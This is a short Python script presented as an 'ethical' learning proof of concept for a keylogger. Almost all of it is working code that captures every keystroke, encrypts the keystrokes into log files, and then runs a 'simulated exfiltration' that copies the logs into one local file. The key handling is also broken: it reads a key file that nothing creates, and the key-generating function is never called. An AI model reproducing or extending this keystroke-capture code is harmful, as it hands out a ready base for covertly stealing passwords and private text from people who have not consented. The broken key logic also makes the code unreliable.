"""
Ethical Keylogger PoC - FOR LEARNING ONLY
Author: Your Name
Usage: Only for authorized, ethical testing on your OWN machine.
"""

from pynput import keyboard
from cryptography.fernet import Fernet
import os
import base64
import datetime

# === Encryption Key (Generate once and reuse securely) ===
def load_key():
    # Generates or loads existing key
    if not os.path.exists("key.key"):
        key = Fernet.generate_key()
        with open("key.key", "wb") as key_file:
            key_file.write(key)
    else:
        with open("key.key", "rb") as key_file:
            key = key_file.read()
    return key

with open("protected_key.key", "rb") as key_file:
    key = key_file.read()
fernet = Fernet(key)


# === Logger ===
log_file = os.path.join("logs", f"log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
os.makedirs("logs", exist_ok=True)
buffer = ""

def encrypt_and_store(data):
    encrypted = fernet.encrypt(data.encode())
    with open(log_file, "ab") as file:
        file.write(encrypted + b"\n")

def on_press(key):
    global buffer
    try:
        buffer += key.char
    except AttributeError:
        buffer += f"[{key}]"

    if len(buffer) >= 20:  # Buffer limit for encryption
        encrypt_and_store(buffer)
        buffer = ""

def on_release(key):
    if key == keyboard.Key.esc:  # Kill switch with ESC key
        if buffer:
            encrypt_and_store(buffer)
        print("Keylogger Stopped (ESC pressed)")
        return False

# === Start Listening ===
print("[*] Keylogger started ethically. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# === Simulated Exfiltration (ETHICAL) ===
def simulate_exfiltration():
    print("[*] Simulating exfiltration to localhost (just file copy).")
    simulated_server = "localhost_received_logs.txt"
    with open(simulated_server, "wb") as dest:
        for filename in os.listdir("logs"):
            with open(os.path.join("logs", filename), "rb") as src:
                dest.write(src.read())
    print("[*] Exfiltration simulation complete.")

simulate_exfiltration()
